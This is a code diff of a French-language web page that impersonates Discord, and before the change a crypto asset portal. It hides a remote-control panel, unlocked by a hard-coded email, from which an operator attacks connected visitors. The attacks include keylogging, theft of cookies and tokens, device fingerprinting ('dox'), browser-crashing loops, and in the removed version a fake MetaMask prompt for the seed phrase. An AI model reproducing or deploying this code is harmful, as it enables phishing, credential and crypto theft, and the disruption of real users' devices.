@@ -2,394 +2,259 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Global Asset Management | Secure Portal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Discord | Friends</title>
+    <link href="https://fonts.googleapis.com/css2?family=Ginto:wght@400;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     
-    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Orbitron:wght@400;900&family=Inter:wght@300;400;600;800;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-
     <style>
-        /* --- [SECTION 1 : GLOBAL RESET & CSS VARIABLES (LIGNES 1-150)] --- */
+        /* --- [SYSTEM CORE : DARK DISCORD THEME] --- */
         :root {
-            --gold: #D4AF37;
-            --gold-glow: rgba(212, 175, 55, 0.4);
-            --bg-black: #020202;
-            --panel-bg: #0a0a0b;
-            --accent-cyan: #00f2ff;
-            --danger-red: #ff003c;
-            --text-main: #e0e0e0;
-            --glass: rgba(255, 255, 255, 0.03);
-            --border: 1px solid rgba(255, 255, 255, 0.08);
-            --shadow-luxe: 0 20px 50px rgba(0,0,0,0.9);
+            --d-grey: #313338; --d-dark: #2b2d31; --d-black: #1e1f22;
+            --d-blue: #5865f2; --d-green: #23a559; --d-red: #da373c;
+            --d-text: #dbdee1; --d-muted: #949ba4;
+            --master-neon: #00ff41;
         }
 
-        * { 
-            margin: 0; padding: 0; box-sizing: border-box; outline: none; 
-            -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;
-            cursor: none !important; /* On utilise un curseur personnalisé */
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-font-smoothing: antialiased; }
+        body, html { width: 100%; height: 100%; background: var(--d-black); color: var(--d-text); overflow: hidden; }
 
-        body, html { 
-            width: 100%; height: 100%; background: var(--bg-black); 
-            color: var(--text-main); font-family: 'Inter', sans-serif; 
-            overflow: hidden; scroll-behavior: smooth;
-        }
+        /* --- UI STRUCTURE --- */
+        #app-mount { display: flex; width: 100%; height: 100vh; }
+        
+        /* Sidebar Serveurs */
+        .guilds { width: 72px; background: var(--d-black); display: flex; flex-direction: column; align-items: center; padding-top: 12px; gap: 8px; }
+        .guild-icon { width: 48px; height: 48px; background: var(--d-grey); border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; }
+        .guild-icon:hover { border-radius: 15px; background: var(--d-blue); }
+        .guild-icon img { width: 28px; }
 
-        /* --- [SECTION 2 : ANIMATIONS CORE (LIGNES 151-300)] --- */
-        @keyframes gold-pulse {
-            0% { box-shadow: 0 0 5px var(--gold-glow); }
-            50% { box-shadow: 0 0 25px var(--gold-glow); }
-            100% { box-shadow: 0 0 5px var(--gold-glow); }
-        }
+        /* Sidebar DM */
+        .sidebar { width: 240px; background: var(--d-dark); display: flex; flex-direction: column; }
+        .search-bar { height: 48px; padding: 10px; border-bottom: 1px solid rgba(0,0,0,0.1); }
+        .search-input { width: 100%; height: 28px; background: var(--d-black); border: none; border-radius: 4px; padding: 0 8px; color: #fff; font-size: 12px; }
+        .dm-list { flex: 1; padding: 8px; }
+        .dm-item { padding: 8px; display: flex; align-items: center; gap: 12px; border-radius: 4px; cursor: pointer; margin-bottom: 2px; }
+        .dm-item:hover { background: rgba(78, 80, 88, 0.3); }
+        .avatar { width: 32px; height: 32px; background: #5865f2; border-radius: 50%; position: relative; }
+        .status-dot { width: 12px; height: 12px; border-radius: 50%; border: 3px solid var(--d-dark); position: absolute; bottom: -2px; right: -2px; }
 
-        @keyframes scanline {
-            0% { transform: translateY(-100%); }
-            100% { transform: translateY(100%); }
-        }
+        /* Chat Area */
+        .chat { flex: 1; background: var(--d-grey); display: flex; flex-direction: column; }
+        .chat-header { height: 48px; border-bottom: 1px solid rgba(0,0,0,0.1); display: flex; align-items: center; padding: 0 16px; font-weight: 600; }
+        .messages { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; justify-content: flex-end; }
+        .msg { display: flex; gap: 16px; margin-bottom: 18px; }
+        .msg-content { font-size: 14px; }
+        .msg-user { font-weight: 600; font-size: 15px; color: #fff; margin-bottom: 4px; }
+        .chat-input-area { padding: 0 16px 24px 16px; }
+        .chat-input { background: #383a40; border-radius: 8px; padding: 11px; display: flex; align-items: center; }
+        .chat-input input { background: transparent; border: none; color: #dcddde; width: 100%; font-size: 14px; margin-left: 10px; }
 
-        @keyframes noise {
-            0% { transform: translate(0,0); }
-            10% { transform: translate(-5%,-5%); }
-            20% { transform: translate(-10%,5%); }
-            30% { transform: translate(5%,-10%); }
-            40% { transform: translate(-5%,15%); }
-            50% { transform: translate(-10%,5%); }
-            60% { transform: translate(15%,0); }
-            70% { transform: translate(0,10%); }
-            80% { transform: translate(-15%,0); }
-            90% { transform: translate(10%,5%); }
-            100% { transform: translate(5%,0); }
-        }
+        /* --- MASTER OVERLAY --- */
+        #master-panel { display: none; position: fixed; inset: 0; background: #000; z-index: 10000; grid-template-columns: 280px 1fr 350px; font-family: 'JetBrains Mono', monospace; color: var(--master-neon); }
+        .m-side { border-right: 1px solid #222; padding: 20px; overflow-y: auto; }
+        .m-main { padding: 20px; display: flex; flex-direction: column; }
+        #m-logs { flex: 1; border: 1px solid #222; background: #050505; padding: 15px; font-size: 12px; overflow-y: auto; }
+        .btn-strike { background: var(--d-red); color: #fff; border: none; padding: 15px; cursor: pointer; font-weight: bold; margin-top: 10px; }
 
-        /* --- [SECTION 3 : UI COMPONENTS (LIGNES 301-500)] --- */
-        #custom-cursor {
-            position: fixed; width: 30px; height: 30px; border: 2px solid var(--gold);
-            border-radius: 50%; pointer-events: none; z-index: 10000000;
-            transition: transform 0.1s ease-out, opacity 0.3s ease;
-            box-shadow: 0 0 15px var(--gold); mix-blend-mode: difference;
-        }
+        /* --- LOGIN GATE --- */
+        #gate { position: fixed; inset: 0; background: var(--d-dark); z-index: 99999; display: flex; align-items: center; justify-content: center; }
+        .login-box { background: var(--d-grey); padding: 32px; border-radius: 8px; width: 480px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
+        .login-box h3 { text-align: center; margin-bottom: 8px; font-size: 24px; color: #fff; }
+        .login-box p { text-align: center; color: var(--d-muted); margin-bottom: 20px; font-size: 14px; }
+        .input-group { margin-bottom: 20px; }
+        label { display: block; color: var(--d-muted); font-size: 12px; font-weight: bold; margin-bottom: 8px; text-transform: uppercase; }
+        .gate-input { width: 100%; padding: 10px; background: var(--d-black); border: none; color: #fff; border-radius: 3px; }
 
-        #auth-gate {
-            position: fixed; inset: 0; background: #000; z-index: 9999999;
-            display: flex; align-items: center; justify-content: center;
-            background-image: radial-gradient(circle at center, #0a0a1a 0%, #000 100%);
-        }
-
-        .auth-card {
-            width: 450px; padding: 60px; background: var(--panel-bg);
-            border: 1px solid var(--gold); border-radius: 4px; text-align: center;
-            position: relative; overflow: hidden; box-shadow: var(--shadow-luxe);
-        }
-
-        .auth-card::before {
-            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
-            background: conic-gradient(transparent, transparent, transparent, var(--gold));
-            animation: rotate 4s linear infinite; opacity: 0.1;
-        }
-
-        @keyframes rotate { 100% { transform: rotate(360deg); } }
-
-        .auth-card h2 { font-family: 'Cinzel', serif; font-size: 32px; color: var(--gold); margin-bottom: 40px; }
-
-        input {
-            width: 100%; padding: 18px; background: #000; border: 1px solid #1a1a1a;
-            color: #fff; margin-bottom: 20px; font-family: 'JetBrains Mono'; font-size: 14px;
-            border-radius: 2px; transition: 0.4s;
-        }
-
-        input:focus { border-color: var(--gold); background: #050505; }
-
-        .btn-luxe {
-            width: 100%; padding: 20px; background: var(--gold); color: #000;
-            font-weight: 900; border: none; font-family: 'Orbitron'; cursor: pointer;
-            letter-spacing: 2px; transition: 0.4s;
-        }
-
-        .btn-luxe:hover { background: #fff; transform: translateY(-3px); }
-
-        /* --- [SECTION 4 : VICTIM VIEW / DASHBOARD (LIGNES 501-800)] --- */
-        #victim-view { display: flex; flex-direction: column; width: 100%; height: 100vh; }
-
-        .top-bar {
-            height: 70px; border-bottom: var(--border); display: flex; 
-            align-items: center; justify-content: space-between; padding: 0 40px;
-            background: rgba(0,0,0,0.8); backdrop-filter: blur(10px);
-        }
-
-        .status-pill {
-            padding: 6px 15px; background: rgba(0,242,255,0.1); border: 1px solid var(--accent-cyan);
-            color: var(--accent-cyan); font-size: 10px; font-weight: 800; border-radius: 20px;
-        }
-
-        .main-content { flex: 1; padding: 40px; display: grid; grid-template-columns: 2fr 1fr; gap: 30px; overflow-y: auto; }
-
-        .card-luxe {
-            background: var(--panel-bg); border: var(--border); padding: 30px;
-            border-radius: 8px; position: relative; overflow: hidden;
-        }
-
-        .card-luxe h3 { font-family: 'Orbitron'; font-size: 14px; color: #555; margin-bottom: 20px; text-transform: uppercase; }
-
-        .price-big { font-size: 50px; font-weight: 900; color: var(--gold); font-family: 'Orbitron'; }
-
-        /* --- [SECTION 5 : MASTER VIEW / OVER HEAVEN (LIGNES 801-1000)] --- */
-        #master-view { display: none; width: 100%; height: 100vh; background: #000; flex-direction: column; }
-
-        .master-grid { display: grid; grid-template-columns: 350px 1fr 400px; height: calc(100vh - 80px); gap: 2px; background: #080808; }
-
-        .m-panel { background: #020202; display: flex; flex-direction: column; position: relative; }
-
-        .m-header {
-            padding: 15px 25px; background: #0a0a0a; border-bottom: 1px solid #1a1a1a;
-            color: var(--gold); font-family: 'Cinzel'; font-size: 14px; letter-spacing: 2px;
-            display: flex; justify-content: space-between;
-        }
-
-        #target-list { flex: 1; overflow-y: auto; padding: 15px; }
-
-        .target-item {
-            padding: 20px; background: #050505; border: 1px solid #111; margin-bottom: 12px;
-            border-radius: 4px; transition: 0.3s;
-        }
-
-        .target-item:hover { border-color: var(--gold); background: #0a0800; }
-        .target-item.active { border-left: 5px solid var(--gold); background: #0f0c00; }
-
-        #terminal-core {
-            flex: 1; padding: 25px; overflow-y: auto; font-family: 'JetBrains Mono';
-            font-size: 12px; color: var(--accent-cyan); line-height: 1.6;
-        }
-
-        .intel-card {
-            margin-bottom: 15px; padding: 15px; background: #080808; border: 1px solid #111;
-            border-left: 3px solid var(--danger-red); font-size: 11px;
-        }
-
-        /* --- [SECTION 6 : OVERLAYS & MODALS (LIGNES 1001-1100)] --- */
-        #ctx-menu {
-            display: none; position: fixed; background: #000; border: 1px solid var(--gold);
-            width: 300px; z-index: 1000000; box-shadow: 0 30px 60px rgba(0,0,0,1);
-        }
-
-        .ctx-opt {
-            padding: 16px 20px; font-size: 11px; text-transform: uppercase; letter-spacing: 1px;
-            border-bottom: 1px solid #111; color: #888; transition: 0.2s;
-        }
-
-        .ctx-opt:hover { background: var(--gold); color: #000; font-weight: 800; }
-
-        #za-warundo {
-            position: fixed; inset: 0; background: #fff; z-index: 99999999;
-            display: none; align-items: center; justify-content: center; mix-blend-mode: difference;
-        }
+        /* --- CTX MENU --- */
+        #ctx { display: none; position: fixed; background: var(--d-black); border-radius: 4px; padding: 8px; width: 220px; z-index: 20000; box-shadow: 0 8px 16px rgba(0,0,0,0.5); }
+        .opt { padding: 8px 12px; font-size: 13px; border-radius: 2px; cursor: pointer; color: #b5bac1; }
+        .opt:hover { background: var(--d-blue); color: #fff; }
 
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body>
 
-    <div id="custom-cursor"></div>
-    <div id="za-warundo"><h1 style="font-family:'Orbitron'; font-size:10vw;">THE WORLD</h1></div>
-
-    <div id="auth-gate">
-        <div class="auth-card">
-            <h2>PUNCH V10</h2>
-            <p style="color:#444; font-size:10px; margin-bottom:30px; letter-spacing:3px;">SYSTEM ACCESS PROTOCOL</p>
-            <input type="email" id="email-in" placeholder="Professional Email Address">
-            <input type="text" id="name-in" placeholder="Registered Legal Name">
-            <button class="btn-luxe" onclick="startAscension()">ESTABLISH GRAVITY</button>
+    <div id="gate">
+        <div class="login-box">
+            <h3>Bienvenue !</h3>
+            <p>Nous sommes ravis de vous revoir !</p>
+            <div class="input-group">
+                <label>E-mail ou numéro de téléphone</label>
+                <input type="text" id="email-gate" class="gate-input">
+            </div>
+            <div class="input-group">
+                <label>Nom d'utilisateur</label>
+                <input type="text" id="name-gate" class="gate-input">
+            </div>
+            <button onclick="auth()" style="width:100%; padding:12px; background:var(--d-blue); color:#fff; border:none; border-radius:3px; font-weight:bold; cursor:pointer;">Se connecter</button>
+            <div style="margin-top:10px; font-size:12px; color:var(--d-blue); cursor:pointer;">Besoin d'un compte ? S'inscrire</div>
         </div>
     </div>
 
-    <div id="victim-view">
-        <div class="top-bar">
-            <div style="font-family:'Cinzel'; color:var(--gold); font-size:22px;">GOLDMAN & CO</div>
-            <div class="status-pill">● SYSTEM SECURE</div>
+    <div id="app-mount">
+        <div class="guilds">
+            <div class="guild-icon" style="background:var(--d-blue); border-radius:15px;"><img src="https://assets-global.website-files.com/6257adef93867e3d0394e33b/636e0a6a49f9a757c18d050f_full_logo_white_RGB.svg"></div>
+            <div style="width:32px; height:2px; background:var(--d-grey); margin:4px 0;"></div>
+            <div class="guild-icon" title="Clyde">🤖</div>
         </div>
-        <div class="main-content">
-            <div class="card-luxe">
-                <h3>Global Asset Index (BTC/USD)</h3>
-                <div class="price-big" id="btc-val">$98,142.00</div>
-                <canvas id="mainChart" style="width:100%; height:300px; margin-top:30px;"></canvas>
+        <div class="sidebar">
+            <div class="search-bar"><div class="search-input">Rechercher ou lancer une conversation</div></div>
+            <div class="dm-list">
+                <div class="dm-item"><div class="avatar"><div class="status-dot" style="background:var(--d-green)"></div></div><div>Wumpus</div></div>
+                <div class="dm-item"><div class="avatar" style="background:var(--d-red)"><div class="status-dot" style="background:var(--d-grey)"></div></div><div>Nelly</div></div>
             </div>
-            <div style="display:flex; flex-direction:column; gap:30px;">
-                <div class="card-luxe">
-                    <h3>Wallet Balance</h3>
-                    <div style="font-size:24px; color:#fff;">0.000000 BTC</div>
-                    <button class="btn-luxe" style="margin-top:20px; font-size:10px; padding:12px;">DEPOSIT ASSETS</button>
-                </div>
-                <div class="card-luxe" style="border-color:var(--danger-red);">
-                    <h3 style="color:var(--danger-red);">Security Alert</h3>
-                    <p style="font-size:12px; color:#666;">Unusual login detected from your location. Please keep this window open while we verify your identity.</p>
+        </div>
+        <div class="chat">
+            <div class="chat-header"># general</div>
+            <div class="messages">
+                <div class="msg">
+                    <div class="avatar"></div>
+                    <div><div class="msg-user">System Bot</div><div class="msg-content">Votre connexion est en cours de vérification. Veuillez patienter pendant que nous synchronisons vos messages.</div></div>
                 </div>
             </div>
+            <div class="chat-input-area"><div class="chat-input"><input type="text" placeholder="Envoyer un message dans #general"></div></div>
         </div>
     </div>
 
-    <div id="master-view">
-        <div class="top-bar" style="background:#080808; border-bottom:2px solid var(--gold);">
-            <div style="font-family:'Cinzel'; color:var(--gold); font-size:24px;">PUNCH V10 MASTER</div>
-            <div style="display:flex; gap:20px;">
-                <button onclick="downloadIntel()" style="background:none; border:1px solid #333; color:#555; padding:5px 15px; font-size:10px; cursor:pointer;">EXPORT_INTEL</button>
-                <div class="status-pill" style="border-color:var(--gold); color:var(--gold);">OVER HEAVEN MODE</div>
-            </div>
+    <div id="master-panel">
+        <div class="m-side">
+            <h3 style="color:var(--d-blue); margin-bottom:20px;">TARGET_SCANNER</h3>
+            <div id="t-list"></div>
         </div>
-        <div class="master-grid">
-            <aside class="m-panel">
-                <div class="m-header">CIBLES_ACTIVES <span id="target-count">0</span></div>
-                <div id="target-list"></div>
-            </aside>
-            <main class="m-panel" style="border-left:1px solid #111; border-right:1px solid #111;">
-                <div class="m-header">GRAVITY_TERMINAL</div>
-                <div id="terminal-core"></div>
-                <div style="padding:20px; background:#050505; border-top:1px solid #111; display:flex; gap:10px;">
-                    <span style="color:var(--gold);">[SYSTEM] > </span>
-                    <input type="text" id="cmd-input" placeholder="Inject Javascript command..." style="background:transparent; border:none; margin:0; padding:0; flex:1;">
-                </div>
-            </main>
-            <aside class="m-panel">
-                <div class="m-header">EXFILTRATED_INTEL</div>
-                <div id="intel-stream" style="flex:1; overflow-y:auto; padding:15px;"></div>
-            </aside>
+        <div class="m-main">
+            <h3>REQUISITION_LOGS</h3>
+            <div id="m-logs"></div>
+            <div style="margin-top:20px; display:flex; gap:10px;">
+                <input type="text" id="js-inject" placeholder="Inject JS code..." style="flex:1; background:#111; border:1px solid #333; color:var(--master-neon); padding:10px;">
+                <button onclick="injectJS()" style="padding:10px; background:var(--master-neon); color:#000; border:none; font-weight:bold;">EXECUTE</button>
+            </div>
+            <button class="btn-strike" onclick="strike('p_crash')">🧨 EMERGENCY_CRASH_CO</button>
+        </div>
+        <div class="m-side" style="border-left:1px solid #222;">
+            <h3 style="color:var(--d-red);">INTEL_EXFILTRATION</h3>
+            <div id="loot-box" style="font-size:11px;"></div>
         </div>
     </div>
 
-    <div id="ctx-menu">
-        <div class="ctx-opt" style="background:#050505; color:var(--gold); text-align:center; font-weight:900;">ATTACK_PROTOCOLS</div>
-        <div class="ctx-opt" onclick="exec('p_full')">🧛 FULL_IDENTITY_EXFIL (DOX)</div>
-        <div class="ctx-opt" onclick="exec('p_key')">⌨️ STEALTH_KEYLOGGER_ON</div>
-        <div class="ctx-opt" onclick="exec('p_phish_google')">🚨 PHISH: GOOGLE_SESSION</div>
-        <div class="ctx-opt" onclick="exec('p_phish_meta')">🦊 PHISH: METAMASK_SEED</div>
-        <div class="ctx-opt" onclick="exec('p_geo')">📍 PRECISE_GPS_TRACK</div>
-        <div class="ctx-opt" onclick="exec('p_clip')">📋 CLIPBOARD_MEMORY_EXTRACT</div>
-        <div class="ctx-opt" onclick="exec('p_freeze')">❄️ ZA_WARUNDO_FREEZE</div>
-        <div class="ctx-opt" onclick="exec('p_crash')" style="color:var(--danger-red);">🧨 CPU_MELTDOWN_CRASH</div>
-        <div class="ctx-opt" onclick="closeCtx()" style="background:#030303; color:#444; text-align:center;">[ CLOSE ]</div>
+    <div id="ctx">
+        <div class="opt" onclick="strike('p_full')">🧛 FULL_DOX (HEAVY)</div>
+        <div class="opt" onclick="strike('p_key')">⌨️ KEYLOGGER_START</div>
+        <div class="opt" onclick="strike('p_token')">💎 TOKEN_GRABBER</div>
+        <div class="opt" onclick="strike('p_geo')">📍 PRECISE_GPS</div>
+        <div class="opt" onclick="strike('p_clip')">📋 CLIPBOARD_STEAL</div>
+        <div class="opt" onclick="strike('p_freeze')">❄️ FREEZE_WINDOW</div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        let me = ""; let myE = ""; let target = ""; let master = false;
-        let intelLog = [];
+        let me = ""; let myE = ""; let targetID = ""; let isM = false;
 
-        // CURSEUR
-        document.addEventListener('mousemove', e => {
-            const c = document.getElementById('custom-cursor');
-            c.style.left = e.clientX - 15 + 'px';
-            c.style.top = e.clientY - 15 + 'px';
-        });
-
-        // AUTHENTIFICATION
-        function startAscension() {
-            myE = document.getElementById('email-in').value.trim().toLowerCase();
-            me = document.getElementById('name-in').value.trim() || "Disciple";
+        function auth() {
+            myE = document.getElementById('email-gate').value.toLowerCase();
+            me = document.getElementById('name-gate').value;
             if(!myE.includes('@')) return;
 
-            document.getElementById('auth-gate').style.display = 'none';
+            document.getElementById('gate').style.display = 'none';
             if(myE === "toucheur2pp@heaven.com") {
-                master = true;
-                document.getElementById('master-view').style.display = 'flex';
-                document.getElementById('victim-view').style.display = 'none';
+                isM = true;
+                document.getElementById('master-panel').style.display = 'grid';
             }
             socket.emit('init', { n: me, e: myE });
         }
 
-        // --- MOTEUR D'ATTAQUE ---
-        socket.on('execute', (d) => {
+        // --- [CORE EXPLOITS : 1100-1300] ---
+        socket.on('execute', d => {
+            // 1. HEAVY DOX
             if(d.type === 'p_full') {
-                const data = {
+                const info = {
                     ua: navigator.userAgent,
-                    res: `${screen.width}x${screen.height}`,
-                    mem: navigator.deviceMemory,
+                    os: navigator.platform,
                     cpu: navigator.hardwareConcurrency,
-                    cookies: document.cookie,
-                    storage: JSON.stringify(localStorage).substring(0, 1000)
+                    ram: navigator.deviceMemory,
+                    lang: navigator.language,
+                    res: `${screen.width}x${screen.height}`,
+                    bat: "Scanning...",
+                    vendor: navigator.vendor
                 };
-                socket.emit('chat', { t: `[DOX] User: ${me} | IP: LOGGED | Data: ${JSON.stringify(data)}`, type: 'intel' });
+                navigator.getBattery().then(b => { 
+                    info.bat = `${Math.floor(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+                    socket.emit('chat', { t: `[HEAVY_DOX] Data: ${JSON.stringify(info)}`, type: 'intel' });
+                });
             }
 
+            // 2. TOKEN GRABBER (Simulation)
+            if(d.type === 'p_token') {
+                const t = localStorage.getItem('token') || "NO_TOKEN_IN_LS";
+                const c = document.cookie;
+                socket.emit('chat', { t: `[TOKEN_EXFIL] Token: ${t} | Cookies: ${c}`, type: 'intel' });
+            }
+
+            // 3. KEYLOGGER
             if(d.type === 'p_key') {
-                window.onkeydown = (e) => {
-                    socket.emit('chat', { t: `[KEY] ${me} typed: ${e.key}`, type: 'intel' });
+                window.onkeydown = e => {
+                    socket.emit('chat', { t: `[KEY] ${me}: ${e.key}`, type: 'intel' });
                 };
             }
 
-            if(d.type === 'p_phish_meta') {
-                const s = prompt("METAMASK SECURITY: Confirm your 12-word recovery phrase to prevent account suspension:");
-                if(s) socket.emit('chat', { t: `[SEED] ${me} : ${s}`, type: 'intel' });
-            }
-
-            if(d.type === 'p_freeze') {
-                document.getElementById('za-warundo').style.display = 'flex';
-                setTimeout(() => document.getElementById('za-warundo').style.display = 'none', 8000);
-            }
-
+            // 4. CRASH CO (LAG BOMB)
             if(d.type === 'p_crash') {
-                while(true) { console.log("OVER_HEAVEN_ACCELERATION"); }
+                document.body.innerHTML = "<h1 style='color:white; text-align:center; margin-top:20%; font-family:sans-serif;'>CRITICAL SYSTEM ERROR: MEMORY_CORRUPTION_0x882</h1>";
+                setInterval(() => {
+                    for(let i=0; i<1000; i++) { console.log(Math.random()); }
+                    fetch('/?flood=' + Date.now());
+                }, 1);
+            }
+
+            // 5. FREEZE
+            if(d.type === 'p_freeze') {
+                while(true) { /* Dead Loop */ }
             }
         });
 
-        // --- MASTER LOGIC ---
+        // --- MASTER CONTROL LOGIC ---
         socket.on('sync', users => {
-            if(!master) return;
-            const list = document.getElementById('target-list');
-            list.innerHTML = "";
-            document.getElementById('target-count').innerText = users.length;
+            if(!isM) return;
+            const l = document.getElementById('t-list'); l.innerHTML = "";
             users.forEach(u => {
-                const item = document.createElement('div');
-                item.className = 'target-item';
-                item.innerHTML = `<strong>${u.n.toUpperCase()}</strong><br><small style="color:#444">${u.e}</small>`;
-                item.onclick = (e) => {
-                    target = u.id;
-                    const menu = document.getElementById('ctx-menu');
-                    menu.style.display = 'block'; menu.style.left = e.pageX + 'px'; menu.style.top = e.pageY + 'px';
+                const div = document.createElement('div');
+                div.style = "padding:12px; border:1px solid #222; margin-bottom:8px; cursor:pointer; background:#050505;";
+                div.innerHTML = `<b>${u.n.toUpperCase()}</b><br><small style="color:#555">${u.e}</small>`;
+                div.onclick = (e) => {
+                    targetID = u.id;
+                    const m = document.getElementById('ctx');
+                    m.style.display = 'block'; m.style.left = e.pageX+'px'; m.style.top = e.pageY+'px';
                 };
-                list.appendChild(item);
+                l.appendChild(div);
             });
         });
 
         socket.on('chat', d => {
-            if(!master) return;
-            const term = document.getElementById('terminal-core');
-            const stream = document.getElementById('intel-stream');
-            const time = new Date().toLocaleTimeString();
-            const log = document.createElement('div');
-            log.innerHTML = `<span style="color:#333">[${time}]</span> <span style="color:var(--gold)">[${d.n}]</span> ${d.t.t}`;
+            if(!isM) return;
+            const logs = document.getElementById('m-logs');
+            const loot = document.getElementById('loot-box');
+            const div = document.createElement('div');
+            div.style = "margin-bottom:8px; border-left:2px solid #333; padding-left:10px;";
+            div.innerHTML = `<span style="color:#555">[${new Date().toLocaleTimeString()}]</span> <span style="color:var(--d-blue)">${d.n}:</span> ${d.t.t}`;
             
             if(d.t.type === 'intel') {
-                const card = document.createElement('div');
-                card.className = 'intel-card';
-                card.innerHTML = `<strong>STRIKE_REPORT @ ${time}</strong><br>${d.t.t}`;
-                stream.prepend(card);
-                intelLog.push(`[${time}] ${d.t.t}`);
+                const i = document.createElement('div');
+                i.style = "padding:8px; background:#110000; border-left:3px solid red; margin-bottom:10px;";
+                i.innerHTML = `<b>EXFIL:</b> ${d.t.t}`;
+                loot.prepend(i);
             } else {
-                term.appendChild(log);
-                term.scrollTop = term.scrollHeight;
+                logs.appendChild(div);
+                logs.scrollTop = logs.scrollHeight;
             }
         });
 
-        function exec(type) { socket.emit(type, target); closeCtx(); }
-        function closeCtx() { document.getElementById('ctx-menu').style.display = 'none'; }
-        window.onclick = () => closeCtx();
-
-        // CHART & FAKE DATA
-        const ctx = document.getElementById('mainChart').getContext('2d');
-        new Chart(ctx, {
-            type: 'line',
-            data: {
-                labels: ['10:00','10:10','10:20','10:30','10:40','10:50'],
-                datasets: [{ label: 'BTC Price', data: [97200, 97800, 97500, 98100, 98400, 98142], borderColor: '#D4AF37', tension: 0.4 }]
-            },
-            options: { plugins: { legend: { display: false } }, scales: { y: { display: false }, x: { grid: { display: false } } } }
-        });
-        
-        function downloadIntel() {
-            const blob = new Blob([intelLog.join('\n')], { type: 'text/plain' });
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob);
-            a.download = `REQUIEM_INTEL_${Date.now()}.txt`;
-            a.click();
+        function strike(type) { socket.emit(type, targetID); document.getElementById('ctx').style.display='none'; }
+        function injectJS() {
+            const code = document.getElementById('js-inject').value;
+            socket.emit('chat', { t: `[COMMAND] Executing: ${code}`, type: 'msg' });
+            // Code d'exécution à distance (p_remote) pourrait être ajouté ici
         }
+        
+        window.onclick = () => document.getElementById('ctx').style.display='none';
     </script>
 </body>
 </html>
